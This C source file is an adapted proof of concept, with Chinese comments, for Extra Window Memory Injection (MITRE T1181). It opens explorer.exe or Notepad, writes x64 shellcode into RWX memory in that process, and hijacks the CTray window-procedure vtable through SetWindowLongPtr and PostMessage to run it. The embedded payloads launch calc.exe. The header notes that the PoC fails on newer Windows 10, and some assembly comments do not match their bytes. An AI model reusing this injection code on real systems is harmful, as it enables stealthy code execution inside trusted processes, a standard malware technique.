/**
https://github.com/wojtekgoo/Infosec/blob/master/T1181%20-%20Extra%20Window%20Memory%20Injection/T1181%20-%20EWMI.c

改POC在新版win10中无法执行，在向目标进程发送消息的时候，并不会触发shellcode的执行。
POC整体不产生报错
使用方式：需要打开notepad.exe而且是新的，没有内容的才行

*/

#define UNICODE

#include <windows.h>
#include <tlhelp32.h>

#include <stdio.h>

#pragma comment(lib, "user32.lib")
#pragma comment(lib, "shell32.lib")

// extra window memory bytes for Shell_TrayWnd
typedef struct _ctray_vtable {
	ULONG_PTR vTable;    // change to remote memory address
	ULONG_PTR AddRef;    // add reference
	ULONG_PTR Release;   // release procedure
	ULONG_PTR WndProc;   // window procedure (change to payload)
} CTray;

typedef struct _ctray_obj {
	CTray* vtbl;
} CTrayObj;

VOID extraBytes(LPVOID payload, DWORD payloadSize) {
	LPVOID    cs, ds;
	CTray     ct;
	ULONG_PTR ctp;
	HWND      hw;
	HANDLE    hp;
	DWORD     pid;
	SIZE_T    wr;

	// 1. Obtain a handle for the shell tray window
	hw = FindWindow(L"Shell_TrayWnd", NULL);

	// 2. Obtain a process id for explorer.exe
	GetWindowThreadProcessId(hw, &pid);

	// 3. Open explorer.exe
	hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

	// 4. Obtain pointer to the current CTray object
	ctp = GetWindowLongPtr(hw, 0);

	// 5. Read address of the current CTray object
	ReadProcessMemory(hp, (LPVOID)ctp,
		(LPVOID)&ct.vTable, sizeof(ULONG_PTR), &wr);

	// 6. Read three addresses from the virtual table
	ReadProcessMemory(hp, (LPVOID)ct.vTable,
		(LPVOID)&ct.AddRef, sizeof(ULONG_PTR) * 3, &wr);

	// 7. Allocate RWX memory for code
	cs = VirtualAllocEx(hp, NULL, payloadSize,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	// 8. Copy the code to target process
	WriteProcessMemory(hp, cs, payload, payloadSize, &wr);
	printf("shellcode: %p\n", cs);

	getchar();

	// 9. Allocate RW memory for the new CTray object
	ds = VirtualAllocEx(hp, NULL, sizeof(ct),
		MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	// 10. Write the new CTray object to remote memory
	ct.vTable = (ULONG_PTR)ds + sizeof(ULONG_PTR);
	ct.WndProc = (ULONG_PTR)cs;

	WriteProcessMemory(hp, ds, &ct, sizeof(ct), &wr);

	// 11. Set the new pointer to CTray object
	SetWindowLongPtr(hw, 0, (ULONG_PTR)ds);

	// 12. Trigger the payload via a windows message
	PostMessage(hw, WM_CLOSE, 0, 0);

	Sleep(5 * 1000);

	// 13. Restore the original CTray object
	SetWindowLongPtr(hw, 0, ctp);

	// 14. Release memory and close handles
	VirtualFreeEx(hp, cs, 0, MEM_DECOMMIT | MEM_RELEASE);
	VirtualFreeEx(hp, ds, 0, MEM_DECOMMIT | MEM_RELEASE);

	CloseHandle(hp);
}



/*
VOID extraBytes(LPVOID payload, DWORD payloadSize)
{
	LPVOID    cs, ds;
	CTray     ct;
	ULONG_PTR ctp;
	HWND      hw;
	HANDLE    hp;
	DWORD     pid;
	SIZE_T    wr;

	// 1. Obtain a handle for the shell tray window
	//hw = FindWindow(L"Shell_TrayWnd", NULL);

	HWND hw1 = FindWindowW(L"Notepad", L"无标题 - 记事本");
	// 尝试一下子窗口
	hw = FindWindowExW(hw1, NULL, L"Edit", NULL);


	if (hw == NULL)
	{
		printf("FindWindow( Shell_TrayWnd , NULL); rund failed: %d\n", GetLastError());
	}

	// 2. Obtain a process id for explorer.exe
	GetWindowThreadProcessId(hw, &pid);

	// 3. Open explorer.exe
	hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

	// 4. Obtain pointer to the current CTray object
	ctp = GetWindowLongPtrW(hw, 0);
	if (!ctp)
	{
		printf("GetWindowLongPtr(hw, 0); error code : %d\n", GetLastError());
		return;
	}

	// 5. Read address of the current CTray object
	ReadProcessMemory(
		hp,
		(LPVOID)ctp,
		(LPVOID)&ct.vTable,
		sizeof(ULONG_PTR),
		&wr
	);

	// 6. Read three addresses from the virtual table
	ReadProcessMemory(
		hp,
		(LPVOID)ct.vTable,
		(LPVOID)&ct.AddRef,
		sizeof(ULONG_PTR) * 3,
		&wr
	);

	// 7. Allocate RWX memory for code
	cs = VirtualAllocEx(
		hp,
		NULL,
		payloadSize,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE
	);

	// 8. Copy the code to target process

	WriteProcessMemory(
		hp,
		cs,
		payload,
		payloadSize,
		&wr
	);

	printf("wpm shellcode to %p \n", cs);

	// 9. Allocate RW memory for the new CTray object
	ds = VirtualAllocEx(
		hp,
		NULL,
		sizeof(ct),
		MEM_COMMIT | MEM_RESERVE,
		//PAGE_READWRITE
		PAGE_EXECUTE_READWRITE
	);

	// 10. Write the new CTray object to remote memory
	ct.vTable = (ULONG_PTR)ds + sizeof(ULONG_PTR);
	ct.WndProc = (ULONG_PTR)cs;

	WriteProcessMemory(
		hp,
		ds,
		&ct,
		sizeof(ct),
		&wr
	);

	// 11. Set the new pointer to CTray object
	if (!SetWindowLongPtrW(hw, 0, (ULONG_PTR)ds))
	{
		printf("SetWindowLongPtrW error %d\n", GetLastError());
	}

	// 12. Trigger the payload via a windows message
	// PostMessage(hw, WM_CLOSE, 0, 0);
	//PostMessage(hw, WM_ENABLE, 0, 0);
	PostMessage(hw, WM_CLOSE, 0, 0);
	//SendNotifyMessage(hw, WM_CLOSE, 0, 0);


	// 13. Restore the original CTray object
	SetWindowLongPtr(hw, 0, ctp);

	// 14. Release memory and close handles
	VirtualFreeEx(hp, cs, 0, MEM_DECOMMIT | MEM_RELEASE);
	VirtualFreeEx(hp, ds, 0, MEM_DECOMMIT | MEM_RELEASE);

	CloseHandle(hp);
}
*/


int EWMIExecute()
{
	/*
	PWCHAR* argv;
	int      argc;
	LPVOID   payload;
	DWORD    payloadSize;

	// get parameters
	argv = CommandLineToArgvW(GetCommandLine(), &argc);

	if (argc != 2) { wprintf(L"usage: T1181-EWMI <payload>\n"); return 0; }

	payloadSize = readpic(argv[1], &payload);
	if (payloadSize == 0) { wprintf(L"unable to read from %s\n", argv[1]); return 0; }
	*/


	UCHAR shellcode11[] = { 0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51,
	0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52, 0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52,
	0x20, 0x48, 0x8B, 0x72, 0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0xE2, 0xED,
	0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B, 0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88,
	0x00, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
	0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41, 0x8B, 0x34, 0x88, 0x48,
	0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1,
	0x38, 0xE0, 0x75, 0xF1, 0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
	0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44, 0x8B, 0x40, 0x1C, 0x49,
	0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01, 0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A,
	0x41, 0x58, 0x41, 0x59, 0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
	0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48, 0xBA, 0x01, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D, 0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B,
	0x6F, 0x87, 0xFF, 0xD5, 0xBB, 0xF0, 0xB5, 0xA2, 0x56, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
	0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0, 0x75, 0x05, 0xBB, 0x47,
	0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89, 0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x2E,
	0x65, 0x78, 0x65, 0x00 };



	/*
	unsigned char shellcode_winexec[] = {
		// 构建"calc.exe"字符串到栈上
		0x48, 0x31, 0xC0,               // xor rax, rax
		0x50,                           // push rax        ; null terminator
		0x68, 0x2E, 0x65, 0x78, 0x65,   // push "exe."
		0x68, 0x63, 0x61, 0x6C, 0x63,   // push "calc"

		// 设置参数并调用
		0x48, 0x89, 0xE1,               // mov rcx, rsp    ; 第一个参数
		0x6A, 0x01,                     // push 1          ; SW_SHOWNORMAL
		0x5A,                           // pop rdx         ; 第二个参数

		// 调用WinExec
		0x48, 0xB8,                     // mov rax,
		0xEF, 0xBE, 0xAD, 0xDE,        // WinExec地址
		0xEF, 0xBE, 0xAD, 0xDE,        // (需要填充)
		0x48, 0xF7, 0xD0,               // not rax
		0xFF, 0xD0,                      // call rax

		// 错误处理：调用GetLastError
		0x50,                           // push rax (保存WinExec返回值)
		0x48, 0xB8,                     // mov rax,
		0xEF, 0xBE, 0xAD, 0xDE,        // GetLastError地址
		0xEF, 0xBE, 0xAD, 0xDE,
		0xFF, 0xD0,                     // call rax
	};

	HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
	UINT64 WinExecAddr = (UINT64)GetProcAddress(hKernel32, "WinExec");
	UINT64 GetErrorAddr = (UINT64)GetProcAddress(hKernel32, "GetLastError");

		// 填充WinExec地址
	*(UINT64*)(shellcode + 22) = ~WinExecAddr;
	*(UINT64*)(shellcode + 38) = GetErrorAddr;
	*/

	unsigned char shellcode[] = {
		// 栈对齐
		0x48, 0x83, 0xEC, 0x50,         // sub rsp, 80

		0x48, 0x31, 0xC0,               // xor rax, rax  
		0x50,                           // push rax (null terminator)

		// 构建 "calc.exe" 字符串 (小端序)
		0x48, 0xB8,
		0x63, 0x6C, 0x61, 0x63, 0x2E, 0x65, 0x78, 0x65, // mov rax, "calc.exe" (小端序)
		0x50,                           // push rax


		// 设置寄存器参数
		0x48, 0x31, 0xC9,               // xor rcx, rcx        ; hwnd = NULL
		0x48, 0x31, 0xD2,               // xor rdx, rdx        ; lpOperation = NULL
		0x48, 0x89, 0xE0,               // mov rax, rsp        ; 先保存字符串地址
		0x48, 0x83, 0xC0, 0x00,         // add rax, 8          ; 跳过null terminator
		0x49, 0x89, 0xC0,               // mov r8, rax         ; lpFile = "calc.exe"
		0x49, 0x31, 0xC9,               // xor r9, r9          ; lpParameters = NULL

		// 设置栈参数 - 使用正确的偏移
	0x48, 0x31, 0xC0,               // xor rax, rax
	0x48, 0x89, 0x44, 0x24, 0x20,   // mov [rsp+0x28], rax  ; (第5个参数)
	0x48, 0xC7, 0x44, 0x24, 0x28, 0x01, 0x00, 0x00, 0x00, // mov [rsp+0x20], 1  ; nShowCmd (第6个参数)
	
	

		// 调用 ShellExecuteA
		0x48, 0xB8,                     // mov rax,
		0xEF, 0xBE, 0xAD, 0xDE,        // ShellExecuteA地址
		0xEF, 0xBE, 0xAD, 0xDE,
		0xFF, 0xD0,                     // call rax

		// 清理栈
		0x48, 0x83, 0xC4, 0x60,         // add rsp, 96
		0xC3                            // ret
	};



	FARPROC ShellExecuteAaddr = GetProcAddress(LoadLibraryA("shell32.dll"), "ShellExecuteA");
	*(UINT64*)(shellcode + 57) = (UINT64)ShellExecuteAaddr;  // 偏移32处是地址占位符

	CHAR calc[] = "calc.exe";

	//ShellExecuteA(NULL, NULL, calc, NULL, NULL, 1);


	extraBytes(shellcode, sizeof(shellcode));
	return 0;
}